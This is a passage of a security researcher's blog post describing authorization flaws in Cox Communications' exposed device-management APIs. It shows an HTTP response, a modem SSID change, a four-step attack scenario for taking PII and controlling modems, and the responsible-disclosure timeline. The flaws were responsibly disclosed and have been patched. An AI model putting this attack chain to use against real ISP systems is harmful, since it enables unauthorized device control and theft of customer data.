\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"T0dFek1qTm1OakZoT1RrMk1HSTJPVE0wTnpBek5Ua3pPRFprT0dZeE9ESTZPamhoTnpVMU5UTmxNREF6T1RsaE5XUTVaams1WlRZek16TTNNMlJpWVdVek9qcENVMlp1TjJ0blVsTkNlR1ZhZDJsd05qZGhjWFo0TTJsaVJHSkhlU3N2TUhWVWFYZzJWVTByYzNsT2RYWklMek16VjJ4VldFYzJTMWx5VEVNMVRuSkxOVVF3VFhFek9UVmlUR2RGVFd4RUt6aGFUMnhoZHowOQ==\\\"\"}],\"\\n}\\n\"]}]}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"__className_8a4d12\",\"children\":[\"HTTP/\",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"1.1\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"200\"}],\" OK\\nServer\",[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\":\"}],\" nginx\\n\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\"{\"}],\"\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"\\\"message\\\"\"}],[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\":\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"Success\\\"\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-punctuation\",\"children\":\"}\"}],\"\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"Did it work? It had only given me a blank 200 OK response. I tried re-sending the HTTP request, but the request timed out. My network was offline. The update request must've reset my device.\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"About 5 minutes later, my network rebooted. The SSID name had been updated to “Curry”. I could write and read from anyone's device using this exploit.\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"$\",\"figure\",null,{\"className\":\"prose-img flex flex-col items-center\",\"children\":[[\"$\",\"$L10\",null,{\"src\":\"https://i.imgur.com/AQLhEU7.png\",\"alt\":\"\",\"layout\":\"responsive\",\"loading\":\"lazy\",\"width\":100,\"height\":100}],[\"$\",\"figcaption\",null,{\"children\":\"\"}]]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"This demonstrated that the API calls to update the device configuration worked. This meant that an attacker could've accessed this API to overwrite configuration settings, access the router, and execute commands on the device. At this point, we had a similar set of permissions as the ISP tech support and could've used this access to exploit any of the millions of Cox devices that were accessible through these APIs.\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"I reached out to Cox via their responsible disclosure page and shared details of the vulnerability. They took down the exposed API calls within six hours then began working on the authorization vulnerabilities. I was no longer able to reproduce any of the vulnerabilities the next day.\"}],\"\\n\",[\"$\",\"h2\",null,{\"id\":\"impact\",\"children\":\"Impact\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"This series of vulnerabilities demonstrated a way in which a fully external attacker with no prerequisites could've executed commands and modified the settings of millions of modems, accessed any business customer's PII, and gained essentially the same permissions of an ISP support team.\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"Cox is the largest private broadband provider in the United States, the third-largest cable television provider, and the seventh largest telephone carrier in the country. They have millions of customers and are the most popular ISP in 10 states.\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"An example attack scenario would've looked like the following:\"}],\"\\n\",[\"$\",\"ol\",null,{\"children\":[\"\\n\",[\"$\",\"li\",null,{\"children\":\"Search for a Cox business target through the exposed APIs using their name, phone number, email address, or account number\"}],\"\\n\",[\"$\",\"li\",null,{\"children\":\"Retrieve their full account PII via querying the returned UUID from step one including device MAC addresses, email, phone number, and address\"}],\"\\n\",[\"$\",\"li\",null,{\"children\":\"Query their hardware MAC address to retrieve Wifi password and connected devices\"}],\"\\n\",[\"$\",\"li\",null,{\"children\":\"Execute arbitrary commands, update any device property, and takeover victim accounts\"}],\"\\n\"]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"There were over 700 exposed APIs with many giving administrative functionality (e.g. querying the connected devices of a modem). Each API suffered from the same permission issues where replaying HTTP requests repeatedly would allow an attacker to run unauthorized commands.\"}],\"\\n\",[\"$\",\"h2\",null,{\"id\":\"addendum\",\"children\":\"Addendum\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"After reporting the vulnerability to Cox, they investigated if the specific vector had ever been maliciously exploited in the past and found no history of abuse (the service I found the vulnerabilities in had gone live in 2023, while my device had been compromised in 2021). They had also informed me that they had no affiliation with the DigitalOcean IP address, meaning that the device had definitely been hacked, just not using the method disclosed in this blog post.\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"I'm still super curious on the exact way in which my device was compromised as I had never made my modem externally accessible nor even logged into the device from my home network. This blog post really aims to highlight vulnerabilities in the layer of trust between the ISP and customer devices, but the modem could've been compromised by some other much more boring method (e.g. local CSRF to RCE 0day which I triggered locally within my home network).\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"One of the things I'll never understand was why the attacker was replaying my traffic? They were clearly in my network and could access everything without being detected, why replay all the HTTP requests? So odd.\"}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"Anyway, thanks for reading! More than happy to listen to any theories, comments, or whatever about what happened here. Feel free to reach out at samwcurry (symbol goes here) gmail (dot goes here) com.\"}],\"\\n\",[\"$\",\"h2\",null,{\"id\":\"timeline\",\"children\":\"Timeline\"}],\"\\n\",[\"$\",\"ul\",null,{\"children\":[\"\\n\",[\"$\",\"li\",null,{\"children\":[\"03/04/2024 - Vulnerability reported to Cox via their \",[\"$\",\"a\",null,{\"href\":\"https://www.cox.com/aboutus/policies/cox-security-responsible-disclosure-policy.html\",\"className\":\"text-neutral-700 dark:text-zinc-400 hover:dark:text-white transition-colors text-normal\",\"children\":\"responsible disclosure program\"}]]}],\"\\n\",[\"$\",\"li\",null,{\"children\":\"03/05/2024 - Vulnerability is hot-patched, all non-essential business endpoints return 403 and no longer function\"}],\"\\n\",[\"$\",\"li\",null,{\"children\":\"03/06/2024 - Email Cox that I can no longer reproduce the vulnerability\"}],\"\\n\",[\"$\",\"li\",null,{\"children\":\"03/07/2024 - Cox writes that they are beginning a comprehensive security review\"}],\"\\n\",[\"$\",\"li\",null,{\"children\":\"04/10/2024 - Informed Cox of intent to disclose 90 days from disclosure\"}],\"\\n\",[\"$\",\"li\",null,{\"children\":\"04/29/2024 - Shared link to blog post draft with Cox\"}],\"\\n\"]}],\"\\n\",[\"$\",\"h2\",null,{\"id\":\"thanks\",\"children\":\"Thanks\"}],\"\\n\",[\"$\",\"ul\",null,{\"children\":[\"\\n\",[\"$\",\"li\",null,{\"children\":[\"Thanks to \",[\"$\",\"a\",null,{\"href\":\"https://twitter.com/blastbots\",\"className\":\"text-neutral-700 dark:text-zinc-400 hover:dark:text-white transition-colors text-normal\",\"children\":\"@blastbots\"}],\" for the full redesign of the blog, I can now write posts in markdown and have an RSS feed!\"]}],\"\\n\",[\"$\",\"li\",null,{\"children\":[\"Thanks to \",[\"$\",\"a\",null,{\"href\":\"https://twitter.com/sshell_\",\"className\":\"text-neutral-700 dark:text-zinc-400 hover:dark:text-white transition-colors text-normal\",\"children\":\"Justin Rhinehart\"}],\" and \",[\"$\",\"a\",null,{\"href\":\"https://twitter.com/birchb0y\",\"className\":\"text-neutral-700 dark:text-zinc-400 hover:dark:text-white transition-colors text-normal\",\"children\":\"Alden\"}],\" for working closely with me for the investigation process, providing tons of help doing OSINT stuff.\"]}],\"\\n\",[\"$\",\"li\",null,{\"children\":[\"Thanks to \",[\"$\",\"a\",null,{\"href\":\"https://twitter.com/galnagli\",\"className\":\"text-neutral-700 dark:text-zinc-400 hover:dark:text-white transition-colors text-normal\",\"children\":\"Gal Nagli\"}],\", \",[\"$\",\"a\",null,{\"href\":\"https://twitter.com/bbuerhaus\",\"className\":\"text-neutral-700 dark:text-zinc-400 hover:dark:text-white transition-colors text-normal\",\"children\":\"Brett Buerhaus\"}],\", \",[\"$\",\"a\",null,{\"href\":\"https://twitter.com/avlidienbrunn\",\"className\":\"text-neutral-700 dark:text-zinc-400 hover:dark:text-white transition-colors text-normal\",\"children\":\"Mathias Karlsson\"}],\", \",[\"$\",\"a\",null,{\"href\":\"https://twitter.com/d0nutptr\",\"className\":\"text-neutral-700 dark:text-zinc-400 hover:dark:text-white transition-colors text-normal\",\"children\":\"Nathanial Lattimer\"}],\", \",[\"$\",\"a\",null,{\"href\":\"https://twitter.com/xEHLE_\",\"className\":\"text-neutral-700 dark:text-zinc-400 hover:dark:text-white transition-colors text-normal\",\"children\":\"Maik Robert\"}],\", \",[\"$\",\"a\",null,{\"href\":\"https://twitter.com/infosec_au\",\"className\":\"text-neutral-700 dark:text-zinc-400 hover:dark:text-white transition-colors text-normal\",\"children\":\"Shubham Shah\"}],\", \",[\"$\",\"a\",null,{\"href\":\"https://twitter.com/0xteknogeek\",\"className\":\"text-neutral-700 dark:text-zinc-400 hover:dark:text-white transition-colors text-normal\",\"children\":\"Joel Margolis\"}],\", \",[\"$\",\"a\",null,{\"href\":\"https://twitter.com/Rhynorater\",\"className\":\"text-neutral-700 dark:text-zinc-400 hover:dark:text-white transition-colors text-normal\",\"children\":\"Justin Gardner\"}],\", Daley Borda, \",[\"$\",\"a\",null,{\"href\":\"https://twitter.com/umasiii\",\"className\":\"text-neutral-700 dark:text-zinc-400 hover:dark:text-white transition-colors text-normal\",\"children\":\"William Tom\"}],\", and Ebrietas for reviewing the draft version of this blog post.\"]}],\"\\n\",[\"$\",\"li\",null,{\"children\":\"Thanks to the Cox Communications security team for quickly fixing the issue and staying in touch throughout the process.\"}],\"\\n\"]}]]}],[\"$\",\"div\",null,{\"className\":\"flex flex-col border-t pt-4 border-neutral-700\",\"children\":[[\"$\",\"span\",null,{\"children\":\"Find me on:\"}],[[\"$\",\"span\",\"https://twitter.com/samwcyo\",{\"children\":[\"twitter\",\":\",\" \",[\"$\",\"a\",\"twitter\",{\"className\":\"underline text-neutral-700 dark:text-zinc-400 hover:dark:text-white transition-colors\",\"href\":\"https://twitter.com/samwcyo\",\"children\":\"https://twitter.com/samwcyo\"}]]}],[\"$\",\"span\",\"discord\",{\"children\":[\"discord\",\": \",\"zlz\"]}]]]}]]}],[\"$\",\"footer\",null,{\"className\":\"my-8 text-center flex flex-row gap-4 justify-center\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hover:underline\",\"children\":[\"$\",\"$L11\",null,{\"href\":\"/feed.rss\",\"children\":\"RSS\"}]}],[\"$\",\"span\",null,{\"className\":\"hover:underline\",\"children\":[\"$\",\"$L11\",null,{\"href\":\"https://twitter.com/samwcyo\",\"children\":\"Twitter\"}]}]]}]]}]}]\n"])</script><script>self.__next_f.push([1,"c:[[\"$\",\"meta\",\"0\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}],[\"$\",\"meta\",\"1\",{\"charSet\":\"utf-8\"}],[\"$\",\"title\",\"2\",{\"children\":\"Hacking Millions of Modems (and Investigating Who Hacked My Modem)\"}],[\"$\",\"meta\",\"3\",{\"name\":\"description\",\"content\":\"A technical blog\"}],[\"$\",\"meta\",\"4\",{\"property\":\"og:title\",\"content\":\"Hacking Millions of Modems (and Investigating Who Hacked My Modem)\"}],[\"$\",\"meta\",\"5\",{\"property\":\"og:description\",\"content\":\"Two years ago, something very strange happened to me while working from my home network. I was exploiting a blind XXE vulnerability that required an external HTTP server to smuggle out files, so I spun up an AWS box and ran a simple Python webserver to receive the traffic from the vulnerable server.\"}],[\"$\",\"meta\",\"6\",{\"property\":\"og:site_name\",\"content\":\"samcurry.net\"}],[\"$\",\"meta\",\"7\",{\"property\":\"og:image\",\"content\":\"https://samcurry-11fcyf1zb-sam-currys-projects.vercel.app/images/hacking-millions-of-modems/cover.png\"}],[\"$\",\"meta\",\"8\",{\"name\":\"twitter:card\",\"content\":\"summary_large_image\"}],[\"$\",\"meta\",\"9\",{\"name\":\"twitter:title\",\"content\":\"Hacking Millions of Modems (and Investigating Who Hacked My Modem)\"}],[\"$\",\"meta\",\"10\",{\"name\":\"twitter:description\",\"content\":\"Two years ago, something very strange happened to me while working from my home network. I was exploiting a blind XXE vulnerability that required an external HTTP server to smuggle out files, so I spun up an AWS box and ran a simple Python webserver to receive the traffic from the vulnerable server.\"}],[\"$\",\"meta\",\"11\",{\"name\":\"twitter:image\",\"content\":\"https://samcurry-11fcyf1zb-sam-currys-projects.vercel.app/images/hacking-millions-of-modems/cover.png\"}],[\"$\",\"link\",\"12\",{\"rel\":\"icon\",\"href\":\"/favicon.ico\",\"type\":\"image/x-icon\",\"sizes\":\"32x32\"}],[\"$\",\"meta\",\"13\",{\"name\":\"next-size-adjust\"}]]\n"])</script><script>self.__next_f.push([1,"7:null\n"])</script><script>self.__next_f.push([1,""])</script></body></html>